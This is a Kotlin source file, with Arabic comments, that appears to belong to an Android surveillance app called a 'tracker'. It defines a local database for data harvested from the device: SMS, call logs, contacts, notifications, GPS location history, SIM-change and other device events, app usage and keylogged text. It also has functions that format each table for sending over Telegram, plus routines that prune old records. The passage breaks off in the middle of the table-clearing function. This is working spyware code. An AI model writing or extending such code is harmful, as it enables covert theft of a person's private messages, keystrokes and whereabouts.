package com.abuzahra.tracker

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

/**
 * AppDatabase - مساعد قاعدة بيانات SQLite المحلية
 *
 * يخزن جميع البيانات المجمعة محلياً على الجهاز:
 * - الرسائل النصية (SMS)
 * - سجل المكالمات (Call Logs)
 * - جهات الاتصال (Contacts)
 * - الإشعارات (Notifications)
 * - المواقع الجغرافية (Locations)
 * - أحداث الجهاز (Device Events)
 * - استخدام التطبيقات (App Usage)
 * - سجل لوحة المفاتيح (Keylog)
 *
 * يسمح بالاستعلام عن البيانات وتصديرها إلى تيليجرام
 * ملف قاعدة البيانات: abu_zahra.db
 */
object AppDatabase {

    private const val TAG = "AppDatabase"
    private const val DATABASE_NAME = "abu_zahra.db"
    private const val DATABASE_VERSION = 1

    // ==================== ==================== ====================
    //          أسماء الجداول (Table Names)
    // ==================== ==================== ====================

    const val TABLE_SMS = "sms_messages"
    const val TABLE_CALL_LOGS = "call_logs"
    const val TABLE_CONTACTS = "contacts"
    const val TABLE_NOTIFICATIONS = "notifications"
    const val TABLE_LOCATIONS = "locations"
    const val TABLE_DEVICE_EVENTS = "device_events"
    const val TABLE_APP_USAGE = "app_usage"
    const val TABLE_KEYLOG = "keylog_entries"

    // ==================== ==================== ====================
    //          المتغيرات الداخلية (Internal Variables)
    // ==================== ==================== ====================

    @Volatile
    private var dbHelper: DatabaseHelper? = null

    private val lock = Any()

    // ==================== ==================== ====================
    //          تهيئة قاعدة البيانات (Initialization)
    // ==================== ==================== ====================

    /**
     * تهيئة قاعدة البيانات - يجب استدعاؤها مرة واحدة عند بدء التطبيق
     *
     * @param context سياق التطبيق
     */
    fun initialize(context: Context) {
        synchronized(lock) {
            if (dbHelper == null) {
                Log.d(TAG, "بدء تهيئة قاعدة البيانات: $DATABASE_NAME")
                dbHelper = DatabaseHelper(context.applicationContext)
                // تفعيل الأوتو-فاكيوم عند تهيئة قاعدة البيانات
                try {
                    val db = dbHelper!!.writableDatabase
                    db.execSQL("PRAGMA auto_vacuum = FULL;")
                    db.close()
                    Log.d(TAG, "تم تفعيل AUTO-VACUUM بنجاح")
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في تفعيل AUTO-VACUUM: ${e.message}")
                }
                Log.d(TAG, "تم تهيئة قاعدة البيانات بنجاح - الإصدار: $DATABASE_VERSION")
            } else {
                Log.d(TAG, "قاعدة البيانات مهيأة بالفعل")
            }
        }
    }

    /**
     * التأكد من تهيئة قاعدة البيانات
     * إذا لم تكن مهيأة، يتم تهيئتها تلقائياً
     */
    private fun ensureInitialized(context: Context) {
        if (dbHelper == null) {
            initialize(context)
        }
    }

    /**
     * الحصول على قاعدة البيانات للقراءة
     */
    private fun getReadableDb(context: Context): SQLiteDatabase {
        ensureInitialized(context)
        return dbHelper!!.readableDatabase
    }

    /**
     * الحصول على قاعدة البيانات للكتابة
     */
    private fun getWritableDb(context: Context): SQLiteDatabase {
        ensureInitialized(context)
        return dbHelper!!.writableDatabase
    }

    // ==================== ==================== ====================
    //          أوامر الإدخال - Insert Methods
    // ==================== ==================== ====================

    /**
     * إدراج رسالة نصية جديدة
     *
     * @param context سياق التطبيق
     * @param data خريطة البيانات (phone, body, type, timestamp, date_readable, is_read)
     */
    fun insertSMS(context: Context, data: Map<String, Any?>) {
        synchronized(lock) {
            try {
                val db = getWritableDb(context)
                val values = ContentValues().apply {
                    put("phone", data["phone"]?.toString() ?: "")
                    put("body", data["body"]?.toString() ?: "")
                    put("type", data["type"]?.toString() ?: "inbox")
                    put("timestamp", (data["timestamp"] as? Number)?.toLong() ?: System.currentTimeMillis())
                    put("date_readable", data["date_readable"]?.toString() ?: getCurrentReadableDate())
                    put("is_read", (data["is_read"] as? Number)?.toInt() ?: 0)
                    put("collected_at", System.currentTimeMillis())
                }
                val rowId = db.insertOrThrow(TABLE_SMS, null, values)
                Log.d(TAG, "تم إدراج رسالة نصية - معرف: $rowId | رقم: ${data["phone"]}")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في إدراج رسالة نصية: ${e.message}", e)
            }
        }
    }

    /**
     * إدراج سجل مكالمة جديد
     *
     * @param context سياق التطبيق
     * @param data خريطة البيانات (phone, name, type, duration_seconds, duration_formatted, timestamp, date_readable)
     */
    fun insertCallLog(context: Context, data: Map<String, Any?>) {
        synchronized(lock) {
            try {
                val db = getWritableDb(context)
                val values = ContentValues().apply {
                    put("phone", data["phone"]?.toString() ?: "")
                    put("name", data["name"]?.toString() ?: "")
                    put("type", data["type"]?.toString() ?: "incoming")
                    put("duration_seconds", (data["duration_seconds"] as? Number)?.toInt() ?: 0)
                    put("duration_formatted", data["duration_formatted"]?.toString() ?: "00:00")
                    put("timestamp", (data["timestamp"] as? Number)?.toLong() ?: System.currentTimeMillis())
                    put("date_readable", data["date_readable"]?.toString() ?: getCurrentReadableDate())
                    put("collected_at", System.currentTimeMillis())
                }
                val rowId = db.insertOrThrow(TABLE_CALL_LOGS, null, values)
                Log.d(TAG, "تم إدراج سجل مكالمة - معرف: $rowId | رقم: ${data["phone"]} | نوع: ${data["type"]}")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في إدراج سجل مكالمة: ${e.message}", e)
            }
        }
    }

    /**
     * إدراج جهة اتصال جديدة
     *
     * @param context سياق التطبيق
     * @param data خريطة البيانات (name, phones, emails, contact_id)
     *        phones: مصفوفة JSON للأرقام
     *        emails: مصفوفة JSON للبريد الإلكتروني
     */
    fun insertContact(context: Context, data: Map<String, Any?>) {
        synchronized(lock) {
            try {
                val db = getWritableDb(context)
                val values = ContentValues().apply {
                    put("name", data["name"]?.toString() ?: "")
                    put("phones", data["phones"]?.toString() ?: "[]")
                    put("emails", data["emails"]?.toString() ?: "[]")
                    put("contact_id", data["contact_id"]?.toString() ?: "")
                    put("collected_at", System.currentTimeMillis())
                }
                val rowId = db.insertOrThrow(TABLE_CONTACTS, null, values)
                Log.d(TAG, "تم إدراج جهة اتصال - معرف: $rowId | اسم: ${data["name"]}")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في إدراج جهة اتصال: ${e.message}", e)
            }
        }
    }

    /**
     * إدراج إشعار جديد
     *
     * @param context سياق التطبيق
     * @param data خريطة البيانات (app_name, package_name, category, title, body, timestamp)
     */
    fun insertNotification(context: Context, data: Map<String, Any?>) {
        synchronized(lock) {
            try {
                val db = getWritableDb(context)
                val values = ContentValues().apply {
                    put("app_name", data["app_name"]?.toString() ?: "")
                    put("package_name", data["package_name"]?.toString() ?: "")
                    put("category", data["category"]?.toString() ?: "notification")
                    put("title", data["title"]?.toString() ?: "")
                    put("body", data["body"]?.toString() ?: "")
                    put("timestamp", (data["timestamp"] as? Number)?.toLong() ?: System.currentTimeMillis())
                    put("collected_at", System.currentTimeMillis())
                }
                val rowId = db.insertOrThrow(TABLE_NOTIFICATIONS, null, values)
                Log.d(TAG, "تم إدراج إشعار - معرف: $rowId | تطبيق: ${data["app_name"]} | عنوان: ${data["title"]}")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في إدراج إشعار: ${e.message}", e)
            }
        }
    }

    /**
     * إدراج موقع جغرافي جديد
     *
     * @param context سياق التطبيق
     * @param data خريطة البيانات (latitude, longitude, accuracy, speed, altitude, address, timestamp, date_readable)
     */
    fun insertLocation(context: Context, data: Map<String, Any?>) {
        synchronized(lock) {
            try {
                val db = getWritableDb(context)
                val values = ContentValues().apply {
                    put("latitude", (data["latitude"] as? Number)?.toDouble() ?: 0.0)
                    put("longitude", (data["longitude"] as? Number)?.toDouble() ?: 0.0)
                    put("accuracy", (data["accuracy"] as? Number)?.toDouble() ?: 0.0)
                    put("speed", (data["speed"] as? Number)?.toDouble() ?: 0.0)
                    put("altitude", (data["altitude"] as? Number)?.toDouble() ?: 0.0)
                    put("address", data["address"]?.toString() ?: "")
                    put("timestamp", (data["timestamp"] as? Number)?.toLong() ?: System.currentTimeMillis())
                    put("date_readable", data["date_readable"]?.toString() ?: getCurrentReadableDate())
                    put("collected_at", System.currentTimeMillis())
                }
                val rowId = db.insertOrThrow(TABLE_LOCATIONS, null, values)
                val lat = data["latitude"]
                val lon = data["longitude"]
                Log.d(TAG, "تم إدراج موقع - معرف: $rowId | الإحداثيات: $lat, $lon")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في إدراج موقع جغرافي: ${e.message}", e)
            }
        }
    }

    /**
     * إدراج حدث جهاز جديد
     *
     * @param context سياق التطبيق
     * @param eventType نوع الحدث (app_open, battery_low, sim_change, screen_on, screen_off)
     * @param eventData بيانات الحدث كخريطة (ستُحول إلى JSON)
     */
    fun insertDeviceEvent(context: Context, eventType: String, eventData: Map<String, Any?>) {
        synchronized(lock) {
            try {
                val db = getWritableDb(context)
                val jsonData = mapToJson(eventData)
                val values = ContentValues().apply {
                    put("event_type", eventType)
                    put("event_data", jsonData)
                    put("timestamp", System.currentTimeMillis())
                    put("collected_at", System.currentTimeMillis())
                }
                val rowId = db.insertOrThrow(TABLE_DEVICE_EVENTS, null, values)
                Log.d(TAG, "تم إدراج حدث جهاز - معرف: $rowId | نوع: $eventType")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في إدراج حدث جهاز: ${e.message}", e)
            }
        }
    }

    /**
     * إدراج أو تحديث استخدام تطبيق
     *
     * @param context سياق التطبيق
     * @param packageName اسم حزمة التطبيق
     * @param appName اسم التطبيق
     */
    fun insertAppUsage(context: Context, packageName: String, appName: String) {
        synchronized(lock) {
            try {
                val db = getWritableDb(context)
                // التحقق مما إذا كان التطبيق موجوداً مسبقاً
                val cursor = db.query(
                    TABLE_APP_USAGE,
                    arrayOf("id", "usage_time_ms"),
                    "package_name = ?",
                    arrayOf(packageName),
                    null, null, null
                )

                if (cursor != null && cursor.moveToFirst()) {
                    // تحديث السجل الموجود
                    val existingId = cursor.getLong(cursor.getColumnIndexOrThrow("id"))
                    val existingTime = cursor.getLong(cursor.getColumnIndexOrThrow("usage_time_ms"))
                    val lastUsed = getCurrentReadableDate()

                    val values = ContentValues().apply {
                        put("app_name", appName)
                        put("last_used", lastUsed)
                        put("usage_time_ms", existingTime + 60000) // إضافة دقيقة تقريبية
                        put("timestamp", System.currentTimeMillis())
                    }
                    db.update(TABLE_APP_USAGE, values, "id = ?", arrayOf(existingId.toString()))
                    cursor.close()
                    Log.d(TAG, "تم تحديث استخدام تطبيق: $appName")
                } else {
                    // إدراج سجل جديد
                    cursor?.close()
                    val values = ContentValues().apply {
                        put("package_name", packageName)
                        put("app_name", appName)
                        put("last_used", getCurrentReadableDate())
                        put("usage_time_ms", 60000) // دقيقة أولية
                        put("timestamp", System.currentTimeMillis())
                    }
                    db.insertOrThrow(TABLE_APP_USAGE, null, values)
                    Log.d(TAG, "تم إدراج استخدام تطبيق جديد: $appName")
                }
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في إدراج استخدام تطبيق: ${e.message}", e)
            }
        }
    }

    /**
     * إدراج سجل ضغطة لوحة مفاتيح
     *
     * @param context سياق التطبيق
     * @param appPackage حزمة التطبيق النشط
     * @param text النص المُدخل
     */
    fun insertKeylog(context: Context, appPackage: String, text: String) {
        synchronized(lock) {
            try {
                val db = getWritableDb(context)
                val values = ContentValues().apply {
                    put("app_package", appPackage)
                    put("text", text)
                    put("timestamp", System.currentTimeMillis())
                }
                val rowId = db.insertOrThrow(TABLE_KEYLOG, null, values)
                Log.d(TAG, "تم إدراج سجل لوحة مفاتيح - معرف: $rowId | تطبيق: $appPackage")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في إدراج سجل لوحة مفاتيح: ${e.message}", e)
            }
        }
    }

    // ==================== ==================== ====================
    //          أوامر الاستعلام - Query Methods
    // ==================== ==================== ====================

    /**
     * جلب الرسائل النصية
     *
     * @param context سياق التطبيق
     * @param limit الحد الأقصى للنتائج (الافتراضي: 100)
     * @return قائمة بالرسائل كخرائط
     */
    fun getSMS(context: Context, limit: Int = 100): List<Map<String, Any?>> {
        synchronized(lock) {
            val results = mutableListOf<Map<String, Any?>>()
            try {
                val db = getReadableDb(context)
                val cursor = db.query(
                    TABLE_SMS,
                    null,
                    null, null,
                    null, null,
                    "timestamp DESC",
                    limit.toString()
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        results.add(cursorToMap(it))
                    }
                }
                Log.d(TAG, "تم جلب ${results.size} رسالة نصية")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في جلب الرسائل النصية: ${e.message}", e)
            }
            return results
        }
    }

    /**
     * جلب سجل المكالمات
     *
     * @param context سياق التطبيق
     * @param limit الحد الأقصى للنتائج (الافتراضي: 100)
     * @return قائمة بمكالمات كخرائط
     */
    fun getCallLogs(context: Context, limit: Int = 100): List<Map<String, Any?>> {
        synchronized(lock) {
            val results = mutableListOf<Map<String, Any?>>()
            try {
                val db = getReadableDb(context)
                val cursor = db.query(
                    TABLE_CALL_LOGS,
                    null,
                    null, null,
                    null, null,
                    "timestamp DESC",
                    limit.toString()
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        results.add(cursorToMap(it))
                    }
                }
                Log.d(TAG, "تم جلب ${results.size} سجل مكالمة")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في جلب سجل المكالمات: ${e.message}", e)
            }
            return results
        }
    }

    /**
     * جلب جهات الاتصال
     *
     * @param context سياق التطبيق
     * @param limit الحد الأقصى للنتائج (الافتراضي: 200)
     * @return قائمة بجهات الاتصال كخرائط
     */
    fun getContacts(context: Context, limit: Int = 200): List<Map<String, Any?>> {
        synchronized(lock) {
            val results = mutableListOf<Map<String, Any?>>()
            try {
                val db = getReadableDb(context)
                val cursor = db.query(
                    TABLE_CONTACTS,
                    null,
                    null, null,
                    null, null,
                    "name ASC",
                    limit.toString()
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        results.add(cursorToMap(it))
                    }
                }
                Log.d(TAG, "تم جلب ${results.size} جهة اتصال")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في جلب جهات الاتصال: ${e.message}", e)
            }
            return results
        }
    }

    /**
     * جلب الإشعارات
     *
     * @param context سياق التطبيق
     * @param appName اسم التطبيق للتصفية (اختياري)
     * @param limit الحد الأقصى للنتائج (الافتراضي: 100)
     * @return قائمة بالإشعارات كخرائط
     */
    fun getNotifications(context: Context, appName: String? = null, limit: Int = 100): List<Map<String, Any?>> {
        synchronized(lock) {
            val results = mutableListOf<Map<String, Any?>>()
            try {
                val db = getReadableDb(context)
                val selection = if (appName != null) "app_name = ?" else null
                val selectionArgs = if (appName != null) arrayOf(appName) else null

                val cursor = db.query(
                    TABLE_NOTIFICATIONS,
                    null,
                    selection, selectionArgs,
                    null, null,
                    "timestamp DESC",
                    limit.toString()
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        results.add(cursorToMap(it))
                    }
                }
                Log.d(TAG, "تم جلب ${results.size} إشعار ${if (appName != null) "من $appName" else ""}")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في جلب الإشعارات: ${e.message}", e)
            }
            return results
        }
    }

    /**
     * جلب آخر موقع جغرافي مسجل
     *
     * @param context سياق التطبيق
     * @return خريطة ببيانات الموقع أو null إذا لم يكن موجوداً
     */
    fun getLatestLocation(context: Context): Map<String, Any?>? {
        synchronized(lock) {
            try {
                val db = getReadableDb(context)
                val cursor = db.query(
                    TABLE_LOCATIONS,
                    null,
                    null, null,
                    null, null,
                    "timestamp DESC",
                    "1"
                )
                cursor?.use {
                    if (it.moveToFirst()) {
                        return cursorToMap(it)
                    }
                }
                Log.d(TAG, "لم يتم العثور على موقع مسجل")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في جلب آخر موقع: ${e.message}", e)
            }
            return null
        }
    }

    /**
     * جلب سجل المواقع الجغرافية
     *
     * @param context سياق التطبيق
     * @param limit الحد الأقصى للنتائج (الافتراضي: 50)
     * @return قائمة بالمواقع كخرائط
     */
    fun getLocationHistory(context: Context, limit: Int = 50): List<Map<String, Any?>> {
        synchronized(lock) {
            val results = mutableListOf<Map<String, Any?>>()
            try {
                val db = getReadableDb(context)
                val cursor = db.query(
                    TABLE_LOCATIONS,
                    null,
                    null, null,
                    null, null,
                    "timestamp DESC",
                    limit.toString()
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        results.add(cursorToMap(it))
                    }
                }
                Log.d(TAG, "تم جلب ${results.size} موقع من السجل")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في جلب سجل المواقع: ${e.message}", e)
            }
            return results
        }
    }

    /**
     * جلب أحداث الجهاز
     *
     * @param context سياق التطبيق
     * @param eventType نوع الحدث للتصفية (اختياري)
     * @param limit الحد الأقصى للنتائج (الافتراضي: 50)
     * @return قائمة بأحداث الجهاز كخرائط
     */
    fun getDeviceEvents(context: Context, eventType: String? = null, limit: Int = 50): List<Map<String, Any?>> {
        synchronized(lock) {
            val results = mutableListOf<Map<String, Any?>>()
            try {
                val db = getReadableDb(context)
                val selection = if (eventType != null) "event_type = ?" else null
                val selectionArgs = if (eventType != null) arrayOf(eventType) else null

                val cursor = db.query(
                    TABLE_DEVICE_EVENTS,
                    null,
                    selection, selectionArgs,
                    null, null,
                    "timestamp DESC",
                    limit.toString()
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        results.add(cursorToMap(it))
                    }
                }
                Log.d(TAG, "تم جلب ${results.size} حدث جهاز ${if (eventType != null) "من نوع $eventType" else ""}")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في جلب أحداث الجهاز: ${e.message}", e)
            }
            return results
        }
    }

    /**
     * جلب استخدام التطبيقات
     *
     * @param context سياق التطبيق
     * @param limit الحد الأقصى للنتائج (الافتراضي: 50)
     * @return قائمة باستخدام التطبيقات كخرائط
     */
    fun getAppUsage(context: Context, limit: Int = 50): List<Map<String, Any?>> {
        synchronized(lock) {
            val results = mutableListOf<Map<String, Any?>>()
            try {
                val db = getReadableDb(context)
                val cursor = db.query(
                    TABLE_APP_USAGE,
                    null,
                    null, null,
                    null, null,
                    "usage_time_ms DESC",
                    limit.toString()
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        results.add(cursorToMap(it))
                    }
                }
                Log.d(TAG, "تم جلب ${results.size} سجل استخدام تطبيقات")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في جلب استخدام التطبيقات: ${e.message}", e)
            }
            return results
        }
    }

    /**
     * جلب سجل لوحة المفاتيح
     *
     * @param context سياق التطبيق
     * @param limit الحد الأقصى للنتائج (الافتراضي: 200)
     * @return قائمة بسجلات لوحة المفاتيح كخرائط
     */
    fun getKeylogs(context: Context, limit: Int = 200): List<Map<String, Any?>> {
        synchronized(lock) {
            val results = mutableListOf<Map<String, Any?>>()
            try {
                val db = getReadableDb(context)
                val cursor = db.query(
                    TABLE_KEYLOG,
                    null,
                    null, null,
                    null, null,
                    "timestamp DESC",
                    limit.toString()
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        results.add(cursorToMap(it))
                    }
                }
                Log.d(TAG, "تم جلب ${results.size} سجل لوحة مفاتيح")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في جلب سجل لوحة المفاتيح: ${e.message}", e)
            }
            return results
        }
    }

    // ==================== ==================== ====================
    //          أوامر العد - Count Methods
    // ==================== ==================== ====================

    /**
     * الحصول على عدد الرسائل النصية المخزنة
     *
     * @param context سياق التطبيق
     * @return عدد الرسائل
     */
    fun getSMSCount(context: Context): Int {
        synchronized(lock) {
            return getCount(context, TABLE_SMS, "عدد الرسائل النصية")
        }
    }

    /**
     * الحصول على عدد سجلات المكالمات المخزنة
     *
     * @param context سياق التطبيق
     * @return عدد المكالمات
     */
    fun getCallCount(context: Context): Int {
        synchronized(lock) {
            return getCount(context, TABLE_CALL_LOGS, "عدد المكالمات")
        }
    }

    /**
     * الحصول على عدد جهات الاتصال المخزنة
     *
     * @param context سياق التطبيق
     * @return عدد جهات الاتصال
     */
    fun getContactCount(context: Context): Int {
        synchronized(lock) {
            return getCount(context, TABLE_CONTACTS, "عدد جهات الاتصال")
        }
    }

    /**
     * الحصول على عدد الإشعارات المخزنة
     *
     * @param context سياق التطبيق
     * @return عدد الإشعارات
     */
    fun getNotificationCount(context: Context): Int {
        synchronized(lock) {
            return getCount(context, TABLE_NOTIFICATIONS, "عدد الإشعارات")
        }
    }

    /**
     * الحصول على عدد المواقع المخزنة
     *
     * @param context سياق التطبيق
     * @return عدد المواقع
     */
    fun getLocationCount(context: Context): Int {
        synchronized(lock) {
            return getCount(context, TABLE_LOCATIONS, "عدد المواقع")
        }
    }

    /**
     * دالة مساعدة لعد الصفوف في جدول معين
     *
     * @param context سياق التطبيق
     * @param table اسم الجدول
     * @param label وصف للسجل (للتسجيل)
     * @return عدد الصفوف
     */
    private fun getCount(context: Context, table: String, label: String): Int {
        try {
            val db = getReadableDb(context)
            val cursor = db.rawQuery("SELECT COUNT(*) FROM $table", null)
            cursor?.use {
                if (it.moveToFirst()) {
                    val count = it.getInt(0)
                    Log.d(TAG, "$label: $count")
                    return count
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في عد $label: ${e.message}", e)
        }
        return 0
    }

    // ==================== ==================== ====================
    //          أوامر التصدير - Export Methods
    // ==================== ==================== ====================

    /**
     * تصدير بيانات جدول كنص منسق جاهز للإرسال عبر تيليجرام
     *
     * @param context سياق التطبيق
     * @param table اسم الجدول المراد تصديره
     * @return النص المنسق للجدول
     */
    fun exportToText(context: Context, table: String): String {
        synchronized(lock) {
            val builder = StringBuilder()
            try {
                val db = getReadableDb(context)
                val tableName = when (table.lowercase()) {
                    "sms", "sms_messages" -> TABLE_SMS
                    "calls", "call_logs", "calllogs" -> TABLE_CALL_LOGS
                    "contacts" -> TABLE_CONTACTS
                    "notifications" -> TABLE_NOTIFICATIONS
                    "location", "locations" -> TABLE_LOCATIONS
                    "events", "device_events", "deviceevents" -> TABLE_DEVICE_EVENTS
                    "app_usage", "appusage", "usage", "apps" -> TABLE_APP_USAGE
                    "keylog", "keylog_entries", "keylogs" -> TABLE_KEYLOG
                    else -> table
                }

                // التحقق من صحة اسم الجدول
                val validTables = listOf(
                    TABLE_SMS, TABLE_CALL_LOGS, TABLE_CONTACTS,
                    TABLE_NOTIFICATIONS, TABLE_LOCATIONS,
                    TABLE_DEVICE_EVENTS, TABLE_APP_USAGE, TABLE_KEYLOG
                )

                if (tableName !in validTables) {
                    Log.e(TAG, "اسم جدول غير صالح: $table")
                    return "❌ اسم جدول غير صالح: $table"
                }

                val cursor = db.query(
                    tableName,
                    null, null, null,
                    null, null,
                    "timestamp DESC"
                )

                // عنوان الجدول
                val tableTitle = when (tableName) {
                    TABLE_SMS -> "📱 الرسائل النصية SMS"
                    TABLE_CALL_LOGS -> "📞 سجل المكالمات"
                    TABLE_CONTACTS -> "📇 جهات الاتصال"
                    TABLE_NOTIFICATIONS -> "🔔 الإشعارات"
                    TABLE_LOCATIONS -> "📍 المواقع الجغرافية"
                    TABLE_DEVICE_EVENTS -> "⚙️ أحداث الجهاز"
                    TABLE_APP_USAGE -> "📦 استخدام التطبيقات"
                    TABLE_KEYLOG -> "⌨️ سجل لوحة المفاتيح"
                    else -> "📋 بيانات"
                }

                val rowCount = cursor?.count ?: 0
                builder.append("$tableTitle\n")
                builder.append("━━━━━━━━━━━━━━━━━━━━━\n")
                builder.append("📊 عدد السجلات: $rowCount\n\n")

                cursor?.use {
                    var index = 0
                    val maxRecords = 100 // حد أقصى للتصدير

                    while (it.moveToNext() && index < maxRecords) {
                        index++
                        builder.append("━━━ <b>#$index</b> ━━━\n")

                        val columnNames = it.columnNames
                        for (colName in columnNames) {
                            val colIndex = it.getColumnIndex(colName)
                            if (colIndex >= 0) {
                                val value = it.getString(colIndex)
                                if (value != null && value.isNotEmpty()) {
                                    // تخطي الحقول الفارغة أو المعرفات الداخلية
                                    if (colName != "id" && colName != "collected_at") {
                                        val displayValue = when (colName) {
                                            "timestamp" -> {
                                                try {
                                                    formatTimestamp(value.toLong())
                                                } catch (e: Exception) {
                                                    value
                                                }
                                            }
                                            "latitude", "longitude" -> {
                                                try {
                                                    String.format("%.6f", value.toDouble())
                                                } catch (e: Exception) {
                                                    value
                                                }
                                            }
                                            else -> value
                                        }
                                        val displayLabel = when (colName) {
                                            "phone" -> "📱 رقم الهاتف"
                                            "body" -> "💬 النص"
                                            "type" -> "📋 النوع"
                                            "name" -> "👤 الاسم"
                                            "duration_formatted" -> "⏱️ المدة"
                                            "duration_seconds" -> "⏱️ المدة (ثواني)"
                                            "app_name" -> "📦 التطبيق"
                                            "package_name" -> "📁 الحزمة"
                                            "category" -> "📂 التصنيف"
                                            "title" -> "📝 العنوان"
                                            "latitude" -> "📍 خط العرض"
                                            "longitude" -> "📍 خط الطول"
                                            "address" -> "🗺️ العنوان"
                                            "accuracy" -> "🎯 الدقة"
                                            "speed" -> "🚀 السرعة"
                                            "altitude" -> "⛰️ الارتفاع"
                                            "date_readable" -> "📅 التاريخ"
                                            "timestamp" -> "⏰ الوقت"
                                            "is_read" -> "📖 مقروء"
                                            "event_type" -> "⚙️ نوع الحدث"
                                            "event_data" -> "📊 بيانات الحدث"
                                            "phones" -> "📞 الأرقام"
                                            "emails" -> "📧 البريد"
                                            "contact_id" -> "🔢 معرف جهة الاتصال"
                                            "last_used" -> "🕐 آخر استخدام"
                                            "usage_time_ms" -> "⏱️ وقت الاستخدام"
                                            "app_package" -> "📦 حزمة التطبيق"
                                            "text" -> "✏️ النص"
                                            else -> colName
                                        }
                                        builder.append("$displayLabel: $displayValue\n")
                                    }
                                }
                            }
                        }
                        builder.append("\n")
                    }

                    if (rowCount > maxRecords) {
                        builder.append("... و ${rowCount - maxRecords} سجل آخر\n")
                    }
                }

                Log.d(TAG, "تم تصدير بيانات جدول [$tableName] - $rowCount سجل")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في تصدير البيانات: ${e.message}", e)
                builder.append("❌ خطأ في تصدير البيانات: ${e.message}\n")
            }
            return builder.toString()
        }
    }

    // ==================== ==================== ====================
    //          أوامر التنظيف - Clear Methods
    // ==================== ==================== ====================

    /**
     * تنظيف البيانات القديمة مع الاحتفاظ ببيانات آخر أيام محددة
     * يعمل على جميع الجداول التي تحتوي على حقل timestamp أو collected_at
     *
     * @param context سياق التطبيق
     * @param keepLastDays عدد الأيام المراد الاحتفاظ ببياناتها (الافتراضي: 7)
     */
    fun clearOldData(context: Context, keepLastDays: Int = 7) {
        synchronized(lock) {
            try {
                val db = getWritableDb(context)
                val cutoffTime = System.currentTimeMillis() - (keepLastDays.toLong() * 24 * 60 * 60 * 1000)
                val cutoffDate = formatTimestamp(cutoffTime)
                var totalDeleted = 0

                // تنظيف جدول الرسائل النصية
                val smsDeleted = db.delete(TABLE_SMS, "timestamp < ?", arrayOf(cutoffTime.toString()))
                totalDeleted += smsDeleted
                if (smsDeleted > 0) {
                    Log.d(TAG, "تم حذف $smsDeleted رسالة نصية قديمة")
                }

                // تنظيف جدول المكالمات
                val callsDeleted = db.delete(TABLE_CALL_LOGS, "timestamp < ?", arrayOf(cutoffTime.toString()))
                totalDeleted += callsDeleted
                if (callsDeleted > 0) {
                    Log.d(TAG, "تم حذف $callsDeleted سجل مكالمة قديم")
                }

                // تنظيف جدول الإشعارات
                val notifsDeleted = db.delete(TABLE_NOTIFICATIONS, "timestamp < ?", arrayOf(cutoffTime.toString()))
                totalDeleted += notifsDeleted
                if (notifsDeleted > 0) {
                    Log.d(TAG, "تم حذف $notifsDeleted إشعار قديم")
                }

                // تنظيف جدول المواقع
                val locsDeleted = db.delete(TABLE_LOCATIONS, "timestamp < ?", arrayOf(cutoffTime.toString()))
                totalDeleted += locsDeleted
                if (locsDeleted > 0) {
                    Log.d(TAG, "تم حذف $locsDeleted موقع قديم")
                }

                // تنظيف جدول أحداث الجهاز
                val eventsDeleted = db.delete(TABLE_DEVICE_EVENTS, "timestamp < ?", arrayOf(cutoffTime.toString()))
                totalDeleted += eventsDeleted
                if (eventsDeleted > 0) {
                    Log.d(TAG, "تم حذف $eventsDeleted حدث جهاز قديم")
                }

                // تنظيف جدول سجل لوحة المفاتيح
                val keylogsDeleted = db.delete(TABLE_KEYLOG, "timestamp < ?", arrayOf(cutoffTime.toString()))
                totalDeleted += keylogsDeleted
                if (keylogsDeleted > 0) {
                    Log.d(TAG, "تم حذف $keylogsDeleted سجل لوحة مفاتيح قديم")
                }

                // تنظيف جدول استخدام التطبيقات (بناءً على collected_at)
                val usageDeleted = db.delete(TABLE_APP_USAGE, "timestamp < ?", arrayOf(cutoffTime.toString()))
                totalDeleted += usageDeleted
                if (usageDeleted > 0) {
                    Log.d(TAG, "تم حذف $usageDeleted سجل استخدام تطبيق قديم")
                }

                // تشغيل VACUUM لتحرير المساحة
                try {
                    db.execSQL("VACUUM;")
                    Log.d(TAG, "تم تشغيل VACUUM لتحرير المساحة")
                } catch (e: Exception) {
                    Log.w(TAG, "تحذير: فشل تشغيل VACUUM: ${e.message}")
                }

                Log.d(TAG, "تم تنظيف البيانات القديمة بنجاح - المحذوف: $totalDeleted سجل (محتفظ بآخر $keepLastDays أيام)")
                Log.d(TAG, "تاريخ القطع: $cutoffDate")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في تنظيف البيانات القديمة: ${e.message}", e)
            }
        }
    }

    /**
     * حذف جميع البيانات من جدول محدد
     *
     * @param context سياق التطبيق
     * @param table اسم الجدول المراد مسحه
     */
    fun clearTable(context: Context, table: String) {
        synchronized(lock) {
            try {
                val db = getWritableDb(context)

                val validTables = mapOf(
                    "sms" to TABLE_SMS,
                    "sms_messages" to TABLE_SMS,
                    "calls" to TABLE_CALL_LOGS,
